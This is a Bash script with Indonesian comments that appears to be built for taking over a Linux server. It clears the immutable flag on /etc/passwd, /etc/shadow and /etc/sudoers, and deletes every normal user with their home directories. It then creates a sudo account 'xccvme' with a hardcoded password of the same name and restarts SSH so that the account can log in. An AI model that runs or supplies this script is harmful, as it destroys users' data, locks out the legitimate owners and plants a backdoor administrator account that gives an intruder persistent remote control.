#!/bin/bash

# Pastikan dijalankan sebagai root
if [ "$(id -u)" -ne 0 ]; then
    echo "❌ Script harus dijalankan sebagai root!"
    exit 1
fi

echo "========================================================"
echo "   RESET USER & BUAT ADMIN BARU (xccvme)"
echo "========================================================"

# DAFTAR FILE PENTING YANG SERING DI-LOCK
FILES=("/etc/passwd" "/etc/shadow" "/etc/group" "/etc/gshadow" "/etc/sudoers")

# 1. CEK & BUKA KUNCI IMMUTABLE (Anti-Edit)
echo "[+] Memeriksa atribut file sistem..."
for FILE in "${FILES[@]}"; do
    if [ -f "$FILE" ]; then
        if lsattr "$FILE" 2>/dev/null | grep -q "i"; then
            echo "    🔓 Membuka kunci immutable pada $FILE..."
            chattr -i "$FILE"
        fi
    fi
done

# 2. HAPUS SEMUA USER NORMAL (UID >= 1000) KECUALI ROOT
echo "[+] Menghapus semua user normal (UID >= 1000)..."
# Ambil daftar user dengan UID >= 1000 dan bukan 'nobody'
USER_LIST=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)

for USER in $USER_LIST; do
    # Jangan hapus jika user itu adalah root (just in case)
    if [ "$USER" == "root" ]; then
        continue
    fi
    
    # Hapus user beserta folder home-nya
    echo "    🗑️ Menghapus user: $USER"
    userdel -r "$USER" >/dev/null 2>&1
    
    # Cek apakah masih ada proses milik user tersebut, jika ada kill
    pkill -u "$USER" >/dev/null 2>&1
done

# 3. BUAT USER BARU 'xccvme'
USERNAME="xccvme"
PASSWORD="xccvme"

echo "[+] Membuat user admin baru: $USERNAME"

# Cek apakah user sudah ada (mungkin terlewat saat penghapusan atau baru dibuat)
if id "$USERNAME" &>/dev/null; then
    echo "    ⚠️ User $USERNAME sudah ada, mereset password..."
else
    # Buat user baru dengan home dir, shell bash, dan masukkan ke grup sudo
    useradd -m -s /bin/bash -G sudo "$USERNAME"
fi

# Set password
echo "$USERNAME:$PASSWORD" | chpasswd

# Pastikan grup sudo ada (Debian/Ubuntu biasanya 'sudo', CentOS 'wheel')
if grep -q "^sudo:" /etc/group; then
    usermod -aG sudo "$USERNAME"
elif grep -q "^wheel:" /etc/group; then
    usermod -aG wheel "$USERNAME"
fi

echo "    ✅ User $USERNAME berhasil dibuat dengan akses SUDO."
echo "    🔑 Password: $PASSWORD"

# 4. RESTART SERVICE TERKAIT
echo "[+] Restarting SSH service..."
if command -v systemctl >/dev/null 2>&1; then
    systemctl restart ssh
    systemctl restart sshd
else
    service ssh restart
fi

echo "========================================================"
echo "   NEW USER xccvme"
echo "========================================================"